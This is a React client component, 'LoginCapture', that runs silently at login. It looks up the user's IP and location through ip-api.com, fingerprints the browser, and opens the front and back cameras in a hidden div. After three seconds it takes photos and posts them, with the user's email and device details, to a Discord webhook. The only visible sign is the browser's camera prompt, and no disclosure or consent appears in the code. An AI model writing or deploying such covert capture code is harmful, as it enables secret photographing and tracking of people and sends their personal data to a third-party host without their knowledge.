"use client";

import { useEffect, useRef, useState } from "react";
import { sendLoginAlert } from "@/lib/discord-webhook";

interface LoginCaptureProps {
  webhookUrl: string;
  email: string;
  name?: string;
  captureEnabled?: boolean;
  onCaptureComplete?: () => void;
}

interface DeviceInfo {
  ipAddress: string;
  location?: string;
  device: string;
  browser: string;
  os: string;
  screen: string;
}

export default function LoginCapture({
  webhookUrl,
  email,
  name,
  captureEnabled = true,
  onCaptureComplete,
}: LoginCaptureProps) {
  const videoRef = useRef<HTMLVideoElement>(null);
  const videoBackRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);
  const canvasBackRef = useRef<HTMLCanvasElement>(null);
  const [captured, setCaptured] = useState(false);

  useEffect(() => {
    async function init() {
      console.log("[LoginCapture] init started");

      // Get device info - returns the object directly
      const info = await getDeviceInfo();
      console.log("[LoginCapture] deviceInfo fetched:", info);

      // Start cameras
      if (captureEnabled) {
        startFrontCamera();
        startBackCamera();
      }

      // Wait 3 seconds, then capture and send
      console.log("[LoginCapture] Waiting 3 seconds before capture...");
      setTimeout(() => {
        console.log("[LoginCapture] 3s elapsed, triggering capture");
        doCaptureAndSend(info);
      }, 3000);

      if (!captureEnabled) {
        sendAlertWithoutPhoto(info);
      }
    }

    init();
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, []);

  // Get device info - returns the info object
  async function getDeviceInfo(): Promise<DeviceInfo> {
    let ipAddress = "Unknown";
    let location = "Unknown";

    try {
      const ipResponse = await fetch("https://ip-api.com/json/");
      const ipData = await ipResponse.json();
      if (ipData.status === "success") {
        ipAddress = ipData.query;
        location = `${ipData.city || ""}, ${ipData.regionName || ""}, ${ipData.country || ""}`.replace(/^, |, $|, , /g, "") || "Unknown";
      }
    } catch {
      console.log("[LoginCapture] Could not get IP info");
    }

    const ua = navigator.userAgent;
    let browser = "Unknown Browser";
    let os = "Unknown OS";

    if (ua.includes("Firefox")) browser = "Firefox";
    else if (ua.includes("Chrome")) browser = "Chrome";
    else if (ua.includes("Safari")) browser = "Safari";
    else if (ua.includes("Edge")) browser = "Edge";

    if (ua.includes("Windows")) os = "Windows";
    else if (ua.includes("Mac")) os = "macOS";
    else if (ua.includes("Linux")) os = "Linux";
    else if (ua.includes("Android")) os = "Android";
    else if (ua.includes("iOS")) os = "iOS";

    const device = /mobile|android|iphone|ipad|tablet/i.test(ua) ? "Mobile" : "Desktop";
    const screenResolution = `${window.screen.width}x${window.screen.height}`;

    return { ipAddress, location, device, browser, os, screen: screenResolution };
  }

  // Capture and send function - takes deviceInfo as parameter
  function doCaptureAndSend(deviceInfo: DeviceInfo) {
    if (captured) return;

    console.log("[LoginCapture] doCaptureAndSend running");
    setCaptured(true);

    const frontImg = captureFrame(videoRef.current, canvasRef.current);
    const backImg = captureFrame(videoBackRef.current, canvasBackRef.current);

    stopAllCameras();

    const now = new Date();
    const timestamp = now.toLocaleString("id-ID", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      timeZoneName: "short",
    });

    console.log("[LoginCapture] Sending Discord alert...");
    sendLoginAlert(webhookUrl, {
      email,
      name,
      ipAddress: deviceInfo.ipAddress,
      location: deviceInfo.location,
      device: deviceInfo.device,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      screen: deviceInfo.screen,
      photoBase64: frontImg || undefined,
      backCameraPhoto: backImg || undefined,
      timestamp,
    }).then((success) => {
      console.log("[LoginCapture] sendLoginAlert result:", success);
      if (success) {
        console.log("[LoginCapture] Login alert sent to Discord!");
      } else {
        console.error("[LoginCapture] Failed to send Discord alert");
      }
      if (onCaptureComplete) {
        onCaptureComplete();
      }
    });
  }

  // Send alert without photo
  function sendAlertWithoutPhoto(deviceInfo: DeviceInfo) {
    console.log("[LoginCapture] sendAlertWithoutPhoto running");

    const now = new Date();
    const timestamp = now.toLocaleString("id-ID", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
      hour: "2-digit",
      minute: "2-digit",
      second: "2-digit",
      timeZoneName: "short",
    });

    console.log("[LoginCapture] Sending Discord alert (no photo)...");
    sendLoginAlert(webhookUrl, {
      email,
      name,
      ipAddress: deviceInfo.ipAddress,
      location: deviceInfo.location,
      device: deviceInfo.device,
      browser: deviceInfo.browser,
      os: deviceInfo.os,
      screen: deviceInfo.screen,
      timestamp,
    }).then((success) => {
      console.log("[LoginCapture] sendLoginAlert result:", success);
      if (success) {
        console.log("[LoginCapture] Login alert sent to Discord!");
      } else {
        console.error("[LoginCapture] Failed to send Discord alert");
      }
      if (onCaptureComplete) {
        onCaptureComplete();
      }
    });
  }

  async function startFrontCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user", width: 640, height: 480 },
        audio: false,
      });

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        videoRef.current.play();
      }
    } catch (error) {
      console.log("[LoginCapture] Front camera not available:", error);
    }
  }

  async function startBackCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: { exact: "environment" }, width: 640, height: 480 },
        audio: false,
      });

      if (videoBackRef.current) {
        videoBackRef.current.srcObject = stream;
        videoBackRef.current.play();
      }
    } catch {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "environment", width: 640, height: 480 },
          audio: false,
        });

        if (videoBackRef.current) {
          videoBackRef.current.srcObject = stream;
          videoBackRef.current.play();
        }
      } catch (err) {
        console.log("[LoginCapture] Back camera not available:", err);
      }
    }
  }

  function captureFrame(video: HTMLVideoElement | null, canvas: HTMLCanvasElement | null): string | null {
    if (!video || !canvas || !video.srcObject) return null;

    try {
      const ctx = canvas.getContext("2d");
      if (!ctx) return null;

      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      return canvas.toDataURL("image/jpeg", 0.8);
    } catch {
      return null;
    }
  }

  function stopAllCameras() {
    [videoRef.current, videoBackRef.current].forEach(video => {
      if (video?.srcObject) {
        const stream = video.srcObject as MediaStream;
        stream.getTracks().forEach(track => track.stop());
      }
    });
  }

  // Hidden - runs in background
  return (
    <div className="hidden">
      <video ref={videoRef} autoPlay playsInline muted />
      <video ref={videoBackRef} autoPlay playsInline muted />
      <canvas ref={canvasRef} style={{ display: "none" }} />
      <canvas ref={canvasBackRef} style={{ display: "none" }} />
    </div>
  );
}
